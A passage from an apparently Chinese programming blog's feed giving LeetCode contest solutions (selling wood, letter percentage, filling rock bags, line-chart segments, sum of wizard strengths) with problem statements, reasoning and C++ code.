class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (res &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                            curr = dp[res - <span class="number">1</span>] | (<span class="number">1</span> &lt;&lt; (res - <span class="number">1</span>));</span><br><span class="line">                            <span class="keyword">if</span> (curr &lt;= dp[res]) &#123;</span><br><span class="line">                                dp[res] = curr;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="5254-卖木头块"><a href="#5254-卖木头块" class="headerlink" title="5254. 卖木头块"></a>5254. 卖木头块</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你两个整数 <code>m</code> 和 <code>n</code> ，分别表示一块矩形木块的高和宽。同时给你一个二维整数数组 <code>prices</code> ，其中 <code>prices[i] = [hi, wi, pricei]</code> 表示你可以以 <code>pricei</code> 元的价格卖一块高为 <code>hi</code> 宽为 <code>wi</code> 的矩形木块。</p>
<p>每一次操作中，你必须按下述方式之一执行切割操作，以得到两块更小的矩形木块：</p>
<ul>
<li>沿垂直方向按高度 完全 切割木块，或</li>
<li>沿水平方向按宽度 完全 切割木块<br>在将一块木块切成若干小木块后，你可以根据 <code>prices</code> 卖木块。你可以卖多块同样尺寸的木块。你不需要将所有小木块都卖出去。你 不能 旋转切好后木块的高和宽。</li>
</ul>
<p>请你返回切割一块大小为 <code>m x n</code> 的木块后，能得到的 最多 钱数。</p>
<p>注意你可以切割木块任意次。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：m = 3, n = 5, prices = [[1,4,2],[2,2,7],[2,1,3]]</span><br><span class="line">输出：19</span><br><span class="line">解释：上图展示了一个可行的方案。包括：</span><br><span class="line">- 2 块 2 x 2 的小木块，售出 2 * 7 = 14 元。</span><br><span class="line">- 1 块 2 x 1 的小木块，售出 1 * 3 = 3 元。</span><br><span class="line">- 1 块 1 x 4 的小木块，售出 1 * 2 = 2 元。</span><br><span class="line">总共售出 14 + 3 + 2 = 19 元。</span><br><span class="line">19 元是最多能得到的钱数。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：m = 4, n = 6, prices = [[3,2,10],[1,4,2],[4,1,3]]</span><br><span class="line">输出：32</span><br><span class="line">解释：上图展示了一个可行的方案。包括：</span><br><span class="line">- 3 块 3 x 2 的小木块，售出 3 * 10 = 30 元。</span><br><span class="line">- 1 块 1 x 4 的小木块，售出 1 * 2 = 2 元。</span><br><span class="line">总共售出 30 + 2 = 32 元。</span><br><span class="line">32 元是最多能得到的钱数。</span><br><span class="line">注意我们不能旋转 1 x 4 的木块来得到 4 x 1 的木块。</span><br></pre></td></tr></table></figure>
<p> </p>
<p>提示：</p>
<ul>
<li><code>1 &lt;= m, n &lt;= 200</code></li>
<li><code>1 &lt;= prices.length &lt;= 2 * 104</code></li>
<li><code>prices[i].length == 3</code></li>
<li><code>1 &lt;= hi &lt;= m</code></li>
<li><code>1 &lt;= wi &lt;= n</code></li>
<li><code>1 &lt;= pricei &lt;= 106</code></li>
<li>所有 <code>(hi, wi)</code> 互不相同 。</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/selling-pieces-of-wood">https://leetcode.cn/problems/selling-pieces-of-wood</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划或者记忆化搜索
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目出的比较新颖，比较有意思的题目。分析题目可以知道相同的 $m \times n$ 的木块所能得到最大值应该是相同的，且他们之间是独立的互不影响。对于 $m \times n$ 的木块一共有 $m + n - 2$ 种不同的切法，比如依次沿着垂直方向可以切 $n-1$ 次，依次沿着水平方向可以有 $m-1$ 次切法，因此设 $dp[m][n]$ 表示 $m \times n$ 大小的木块所能获取的最大值，则根据上述推论可以知道:</li>
</ol>
<ul>
<li>一共有 $m + n - 2$ 种不同的切法:</li>
<li>假设沿着水平方向切，则有 $m - 1$ 种不同的切法，假设从第 $k$ 行切开，则可以得到 $k \times n, (m - k) \times n $ 两块不同的木块，则可以知道此时 $dp[m][n] &#x3D; \max(dp[k][n] + dp[m-k][n]) \quad k \in [1,m-1]$。</li>
<li>假设沿着垂直方向切，则有 $n - 1$ 种不同的切法，假设从第 $k$ 列切开，则可以得到 $ m \times k, m \times (n - k) $ 两块不同的木块，则可以知道此时 $dp[m][n] &#x3D; \max(dp[m][k] + dp[m][n-k]) \quad k \in [1,n-1]$。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$m \times n \times (m + n) $，其中 $m$ 行数， $n$ 表示列数。</li>
<li>空间复杂度：$m \times n$, 其中 $m$ 行数， $n$ 表示列数。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">sellingWood</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> k = prices.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">dp</span>(m + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(n + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp; v : prices) &#123;</span><br><span class="line">            dp[v[<span class="number">0</span>]][v[<span class="number">1</span>]] = v[<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">                <span class="comment">/* vertical */</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt; j; k++) &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">max</span>(dp[i][j], dp[i][k] + dp[i][j - k]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/* horizontal */</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt; i; k++) &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">max</span>(dp[i][j], dp[k][j] + dp[i - k][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode biweekly contest 294</title>
    <url>/2022/01/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/1/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-contest-294"><a href="#leetcode-biweekly-contest-294" class="headerlink" title="leetcode biweekly contest 294"></a>leetcode biweekly contest 294</h2><p>感觉第四题确实是个不错的题目，前三题都太普通的题目。少见的高质量的题目。</p>
<h3 id="2278-字母在字符串中的百分比"><a href="#2278-字母在字符串中的百分比" class="headerlink" title="2278. 字母在字符串中的百分比"></a>2278. 字母在字符串中的百分比</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个字符串 <code>s</code> 和一个字符 <code>letter</code> ，返回在 <code>s</code> 中等于 <code>letter</code> 字符所占的 百分比 ，向下取整到最接近的百分比。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;foobar&quot;, letter = &quot;o&quot;</span><br><span class="line">输出：33</span><br><span class="line">解释：</span><br><span class="line">等于字母 &#x27;o&#x27; 的字符在 s 中占到的百分比是 2 / 6 * 100% = 33% ，向下取整，所以返回 33 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;jjjj&quot;, letter = &quot;k&quot;</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">等于字母 &#x27;k&#x27; 的字符在 s 中占到的百分比是 0% ，所以返回 0 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= s.length &lt;= 100</code></li>
<li><code>s</code> 由小写英文字母组成</li>
<li><code>letter</code> 是一个小写英文字母</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/percentage-of-letter-in-string">https://leetcode.cn/problems/percentage-of-letter-in-string</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接统计字符的个数即可，返回值为 $\lfloor \dfrac{100 * c}{n} \rfloor$。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$, 其中 $n$ 为字符串的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">percentageLetter</span><span class="params">(string s, <span class="type">char</span> letter)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> c :s) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c == letter) &#123;</span><br><span class="line">                cnt++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cnt * <span class="number">100</span> / n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2279-装满石头的背包的最大数量"><a href="#2279-装满石头的背包的最大数量" class="headerlink" title="2279. 装满石头的背包的最大数量"></a>2279. 装满石头的背包的最大数量</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>现有编号从 <code>0</code> 到 <code>n - 1</code> 的 <code>n</code> 个背包。给你两个下标从 0 开始的整数数组 <code>capacity</code> 和 <code>rocks</code> 。第 <code>i</code> 个背包最大可以装 <code>capacity[i]</code> 块石头，当前已经装了 <code>rocks[i]</code> 块石头。另给你一个整数 <code>additionalRocks</code> ，表示你可以放置的额外石头数量，石头可以往 任意 背包中放置。</p>
<p>请你将额外的石头放入一些背包中，并返回放置后装满石头的背包的 最大 数量。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：capacity = [2,3,4,5], rocks = [1,2,4,4], additionalRocks = 2</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">1 块石头放入背包 0 ，1 块石头放入背包 1 。</span><br><span class="line">每个背包中的石头总数是 [2,3,4,4] 。</span><br><span class="line">背包 0 、背包 1 和 背包 2 都装满石头。</span><br><span class="line">总计 3 个背包装满石头，所以返回 3 。</span><br><span class="line">可以证明不存在超过 3 个背包装满石头的情况。</span><br><span class="line">注意，可能存在其他放置石头的方案同样能够得到 3 这个结果。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：capacity = [10,2,2], rocks = [2,2,0], additionalRocks = 100</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">8 块石头放入背包 0 ，2 块石头放入背包 2 。</span><br><span class="line">每个背包中的石头总数是 [10,2,2] 。</span><br><span class="line">背包 0 、背包 1 和背包 2 都装满石头。</span><br><span class="line">总计 3 个背包装满石头，所以返回 3 。</span><br><span class="line">可以证明不存在超过 3 个背包装满石头的情况。</span><br><span class="line">注意，不必用完所有的额外石头。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == capacity.length == rocks.length</code></li>
<li><code>1 &lt;= n &lt;= 5 * 104</code></li>
<li><code>1 &lt;= capacity[i] &lt;= 109</code></li>
<li><code>0 &lt;= rocks[i] &lt;= capacity[i]</code></li>
<li><code>1 &lt;= additionalRocks &lt;= 109</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/maximum-bags-with-full-capacity-of-rocks">https://leetcode.cn/problems/maximum-bags-with-full-capacity-of-rocks</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>贪心算法
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>由于额外的石头有限，肯定是有限将其放置在需要数量最少的背包中，将每个背包装满需要的数量按照从小到大进行排序，然后依次填放即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$，其中 $n$ 为数组中的长度。</li>
<li>空间复杂度：$O(\log n)$, 排序需要的栈空间为 $O(\log n)$.</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximumBags</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; capacity, vector&lt;<span class="type">int</span>&gt;&amp; rocks, <span class="type">int</span> additionalRocks)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = rocks.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">arr</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            arr[i] = capacity[i] - rocks[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[i] &lt;= additionalRocks) &#123;</span><br><span class="line">                additionalRocks -= arr[i];</span><br><span class="line">                ans++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2280-表示一个折线图的最少线段数"><a href="#2280-表示一个折线图的最少线段数" class="headerlink" title="2280. 表示一个折线图的最少线段数"></a>2280. 表示一个折线图的最少线段数</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个二维整数数组 <code>stockPrices</code> ，其中 <code>stockPrices[i] = [dayi, pricei] </code>表示股票在<code> dayi</code> 的价格为 <code>pricei</code> 。折线图 是一个二维平面上的若干个点组成的图，横坐标表示日期，纵坐标表示价格，折线图由相邻的点连接而成。比方说下图是一个例子：</p>
<p>请你返回要表示一个折线图所需要的 最少线段数 。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：stockPrices = [[1,7],[2,6],[3,5],[4,4],[5,4],[6,3],[7,2],[8,1]]</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">上图为输入对应的图，横坐标表示日期，纵坐标表示价格。</span><br><span class="line">以下 3 个线段可以表示折线图：</span><br><span class="line">- 线段 1 （红色）从 (1,7) 到 (4,4) ，经过 (1,7) ，(2,6) ，(3,5) 和 (4,4) 。</span><br><span class="line">- 线段 2 （蓝色）从 (4,4) 到 (5,4) 。</span><br><span class="line">- 线段 3 （绿色）从 (5,4) 到 (8,1) ，经过 (5,4) ，(6,3) ，(7,2) 和 (8,1) 。</span><br><span class="line">可以证明，无法用少于 3 条线段表示这个折线图。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：stockPrices = [[3,4],[1,2],[7,8],[2,3]]</span><br><span class="line">输出：1</span><br><span class="line">解释：</span><br><span class="line">如上图所示，折线图可以用一条线段表示。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= stockPrices.length &lt;= 105</code></li>
<li><code>stockPrices[i].length == 2</code></li>
<li><code>1 &lt;= dayi, pricei &lt;= 109</code></li>
<li>所有 <code>dayi</code> 互不相同 。</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/minimum-lines-to-represent-a-line-chart">https://leetcode.cn/problems/minimum-lines-to-represent-a-line-chart</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>数学
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这个题目毫无意义，感觉就是个简单题目。首先我们将所有的点按照横坐标的大小进行排序，连续的三个点如果不在一条直线上，此时则需要新的折线。设连续的三个点为 $p_1, p_2,p_3$，此时我们只需要判断 $p_3$ 是否在 $p_1$ 与 $p_2$ 构成的直线上即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$, 其中 $n$ 为数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimumLines</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; stockPrices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = stockPrices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(stockPrices.<span class="built_in">begin</span>(), stockPrices.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> x1 = stockPrices[i<span class="number">-2</span>][<span class="number">0</span>] - stockPrices[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> y1 = stockPrices[i<span class="number">-2</span>][<span class="number">1</span>] - stockPrices[i<span class="number">-1</span>][<span class="number">1</span>];</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> x2 = stockPrices[i<span class="number">-1</span>][<span class="number">0</span>] - stockPrices[i][<span class="number">0</span>];</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> y2 = stockPrices[i<span class="number">-1</span>][<span class="number">1</span>] - stockPrices[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (x1 * y2 != x2 * y1) &#123;</span><br><span class="line">                res++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2281-巫师的总力量和"><a href="#2281-巫师的总力量和" class="headerlink" title="2281. 巫师的总力量和"></a>2281. 巫师的总力量和</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>作为国王的统治者，你有一支巫师军队听你指挥。</p>
<p>给你一个下标从 <code>0</code> 开始的整数数组 <code>strength</code> ，其中 <code>strength[i]</code> 表示第 <code>i </code>位巫师的力量值。对于连续的一组巫师（也就是这些巫师的力量值是 <code>strength</code> 的 子数组），总力量 定义为以下两个值的 乘积 ：</p>
<p>巫师中 最弱 的能力值。<br>组中所有巫师的个人力量值 之和 。<br>请你返回 所有 巫师组的 总 力量之和。由于答案可能很大，请将答案对 <code>109 + 7 </code>取余 后返回。</p>
<p>子数组 是一个数组里 非空 连续子序列。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：strength = [1,3,1,2]</span><br><span class="line">输出：44</span><br><span class="line">解释：以下是所有连续巫师组：</span><br><span class="line">- [1,3,1,2] 中 [1] ，总力量值为 min([1]) * sum([1]) = 1 * 1 = 1</span><br><span class="line">- [1,3,1,2] 中 [3] ，总力量值为 min([3]) * sum([3]) = 3 * 3 = 9</span><br><span class="line">- [1,3,1,2] 中 [1] ，总力量值为 min([1]) * sum([1]) = 1 * 1 = 1</span><br><span class="line">- [1,3,1,2] 中 [2] ，总力量值为 min([2]) * sum([2]) = 2 * 2 = 4</span><br><span class="line">- [1,3,1,2] 中 [1,3] ，总力量值为 min([1,3]) * sum([1,3]) = 1 * 4 = 4</span><br><span class="line">- [1,3,1,2] 中 [3,1] ，总力量值为 min([3,1]) * sum([3,1]) = 1 * 4 = 4</span><br><span class="line">- [1,3,1,2] 中 [1,2] ，总力量值为 min([1,2]) * sum([1,2]) = 1 * 3 = 3</span><br><span class="line">- [1,3,1,2] 中 [1,3,1] ，总力量值为 min([1,3,1]) * sum([1,3,1]) = 1 * 5 = 5</span><br><span class="line">- [1,3,1,2] 中 [3,1,2] ，总力量值为 min([3,1,2]) * sum([3,1,2]) = 1 * 6 = 6</span><br><span class="line">- [1,3,1,2] 中 [1,3,1,2] ，总力量值为 min([1,3,1,2]) * sum([1,3,1,2]) = 1 * 7 = 7</span><br><span class="line">所有力量值之和为 1 + 9 + 1 + 4 + 4 + 4 + 3 + 5 + 6 + 7 = 44 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：strength = [5,4,6]</span><br><span class="line">输出：213</span><br><span class="line">解释：以下是所有连续巫师组：</span><br><span class="line">- [5,4,6] 中 [5] ，总力量值为 min([5]) * sum([5]) = 5 * 5 = 25</span><br><span class="line">- [5,4,6] 中 [4] ，总力量值为 min([4]) * sum([4]) = 4 * 4 = 16</span><br><span class="line">- [5,4,6] 中 [6] ，总力量值为 min([6]) * sum([6]) = 6 * 6 = 36</span><br><span class="line">- [5,4,6] 中 [5,4] ，总力量值为 min([5,4]) * sum([5,4]) = 4 * 9 = 36</span><br><span class="line">- [5,4,6] 中 [4,6] ，总力量值为 min([4,6]) * sum([4,6]) = 4 * 10 = 40</span><br><span class="line">- [5,4,6] 中 [5,4,6] ，总力量值为 min([5,4,6]) * sum([5,4,6]) = 4 * 15 = 60</span><br><span class="line">所有力量值之和为 25 + 16 + 36 + 36 + 40 + 60 = 213 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= strength.length &lt;= 105</code></li>
<li><code>1 &lt;= strength[i] &lt;= 109</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-294/problems/sum-of-total-strength-of-wizards/">https://leetcode.cn/contest/weekly-contest-294/problems/sum-of-total-strength-of-wizards/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>单调栈、动态规划
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>动态规划解法思路，需要参考「<a href="https://leetcode.cn/problems/sum-of-subarray-minimums/">907. 子数组的最小值之和</a>」, 知道这个题目这个题目就非常好做了。</li>
</ol>
<ul>
<li>设数组的长度为 $n$, 数组 $s$ 的前 $i$ 项的前缀和为 $$\textit{sum}[i] &#x3D; \sum_{j&#x3D;0}^{i}s[i]$$，前 $i$ 项的前缀和的前缀和为: $$\textit{ssum}[i] &#x3D; \sum_{j&#x3D;0}^{i}sum[j] &#x3D; \sum_{j&#x3D;0}^{i}\sum_{k&#x3D;0}^{j}s[k]$$</li>
<li>设数组中以 $i$ 为起点，以 $j$ 且满足 $(i \le j)$ 的连续子数组的最小值为 $\textit{min}(i,j)$, 设以 $i$ 为起点的子数组的最小值的和为 $\textit{minSum}[i] &#x3D; \sum_{j&#x3D;i}^{n-1}\textit{min}(i,j)$。此处可以利用单调栈来求出 $\textit{minSum}[i]$，具体可以参考「<a href="https://leetcode.cn/problems/sum-of-subarray-minimums/">907. 子数组的最小值之和</a>」的解法即可。</li>
<li>设 $dp[i]$ 表示以 $i$ 为起点的子数组构成的魔力值之和，则此时我们可以知道如下公式:<br>$$dp[i] &#x3D; \sum_{j&#x3D;i}^{n-1}(sum[j] - sum[i-1]) \times min(i,j)$$</li>
<li>我们假设数组中 $i$ 的右侧第一个小于 $s[i]$ 的元素为 $s[j]$，且满足 $i &lt; j \le n - 1$，则此时我们知道当 $i \le k &lt; j $ 时，此时区间 $[i,j-1]$ 之间 $s[i]$ 最小，因此 $min(i,k) &#x3D; s[i]$；当满足 $j \le k &lt; n$ 时，则此时区间 $[i,k]$ 之间可定不是 $s[i]$ 最小，因为此时已知 $s[i] &lt; s[j]$ 最小的值一定在 $j$ 的右侧，因此 $min(i,k) &#x3D; min(j,k)$。此时我们将上述式子从 $j$ 处拆分可以得到如下:<br>$$<br>dp[i] &#x3D; \sum_{k&#x3D;i}^{n-1}(sum[k] - sum[i-1]) \times min(i,k) \<br>&#x3D; \sum_{k&#x3D;i}^{j-1}(sum[k] - sum[i-1]) \times min(i,k) + \sum_{k&#x3D;j}^{n-1}(sum[k] - sum[i-1]) \times min(i,k) \<br>&#x3D; \sum_{k&#x3D;i}^{j-1}(sum[k] - sum[i-1]) \times s[i] + \sum_{k&#x3D;j}^{n-1}(sum[k] - sum[i-1]) \times min(j,k) \<br>&#x3D; (\sum_{k&#x3D;i}^{j-1}sum[k] - (j - i)\times sum[i-1]) \times s[i] + \sum_{k&#x3D;j}^{n-1}(sum[k] - sum[j-1] + sum[j-1] - sum[i-1]) \times min(j,k) \<br>&#x3D; (\sum_{k&#x3D;i}^{j-1}sum[k] - (j - i)\times sum[i-1]) \times s[i] + \sum_{k&#x3D;j}^{n-1}(sum[k] - sum[j-1] ) \times min(j,k) + \sum_{k&#x3D;j}^{n-1}(sum[j-1] - sum[i-1]) \times min(j,k)\<br>&#x3D; (ssum[j-1] - ssum[i-1] + (j-i) \times sum[i-1]) + (sum[j-1] - sum[i-1]) \times \sum_{k&#x3D;j}^{n-1}min(j,k) + \sum_{k&#x3D;j}^{n-1}(sum[k] - sum[j-1] ) \times min(j,k) \<br>&#x3D; (ssum[j-1] - ssum[i-1] + (j-i) \times sum[i-1]) + (sum[j-1] - sum[i-1]) \times minSum[j] + dp[j]<br>$$<br>以上即为我们推导出的动态规划递推公式。</li>
</ul>
<ol start="2">
<li>求每个数的贡献值，设以 $s[i]$ 为最小值得区间为 $[l,r]$，此时以 $s[i]$ 为最小值的子数组的魔力值之和为 $s[i] \times \sum_{j&#x3D;l}^{i}\sum_{k&#x3D;i}^{r}s[k]$，此时我们只需要求出 $[l,r]$ 即可，可以用用单调栈解决上述问题，可以参考<a href="https://leetcode.cn/problems/sum-of-total-strength-of-wizards/solution/ji-suan-mei-ge-shu-zi-zuo-wei-zui-xiao-z-3jvr/">题解</a>,写的很清晰。上述解法难点有两点比较难以处理:</li>
</ol>
<ul>
<li>左右区间中遇到相同的元素如何处理，当时也很疑惑这个问题，没有想明白，后来看了题解，可以用一边严格的小于，另一边小于等于即可规避相同元素的问题，确实非常巧妙。</li>
<li>计算 $s[i] \times \sum_{j&#x3D;l}^{i}\sum_{k&#x3D;i}^{r}s[k]$ 需要用到一些数学变换的技巧，不过还是蛮有意思的思考题目。</li>
</ul>
